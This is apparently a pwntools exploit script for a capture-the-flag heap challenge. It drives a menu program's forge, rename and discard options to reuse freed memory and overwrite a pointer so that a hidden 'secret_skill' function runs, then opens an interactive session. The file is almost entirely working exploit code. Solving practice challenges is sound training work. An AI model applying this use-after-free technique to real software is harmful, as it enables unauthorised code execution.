#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('chall', checksec=False)
# libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
# GDB()

def forge(idx, option, size, name):
    slna(b'> ', 1)
    slna(b'Index: ', idx)
    slna(b'> ', option)
    slna(b'length: ', size)
    sla(b'Name: ', name)

def rename(idx, size, name):
    slna(b'> ', 2)
    slna(b'Index: ', idx)
    slna(b'length: ', size)
    sla(b'Name: ', name)

def discard(idx):
    slna(b'> ', 3)
    slna(b'Index: ', idx)

forge(0, 1, 200, b'aaa')

discard(0)

forge(1, 1, 200, b'aaa')

discard(0)

trash =0x404650

load = flat(
    trash,
    exe.sym.secret_skill
)

rename(1, 20, load)

slna(b'> ', 4)
slna(b'Index: ', 1)


p.interactive()
